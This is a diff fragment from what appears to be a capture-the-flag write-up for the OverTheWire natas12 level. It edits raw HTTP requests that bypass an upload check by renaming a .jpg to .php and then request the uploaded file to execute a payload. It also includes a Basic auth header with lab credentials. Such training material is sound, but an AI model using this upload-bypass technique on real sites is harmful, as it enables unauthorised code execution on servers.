@@ -22,7 +22,7 @@ Content-Disposition: form-data; name="MAX_FILE_SIZE"
 ------WebKitFormBoundarymBkA2bfQQNBrgqHj
 Content-Disposition: form-data; name="filename"
 
-pkss7bauf9.jpg
+pkss7bauf9.php
 ------WebKitFormBoundarymBkA2bfQQNBrgqHj
 Content-Disposition: form-data; name="uploadedfile"; filename="natas12.pass"
 Content-Type: application/octet-stream
@@ -36,7 +36,7 @@ Content-Type: application/octet-stream
 
 ### Request - get data from payload execution
 ```
-GET /upload/b8j5hft2rk.php HTTP/1.1
+GET /upload/pkss7bauf9.php HTTP/1.1
 Host: natas12.natas.labs.overthewire.org
 Authorization: Basic bmF0YXMxMjpFRFhwMHBTMjZ3TEtIWnkxckRCUFVaazBSS2ZMR0lSMw==
 Referer: http://natas12.natas.labs.overthewire.org/
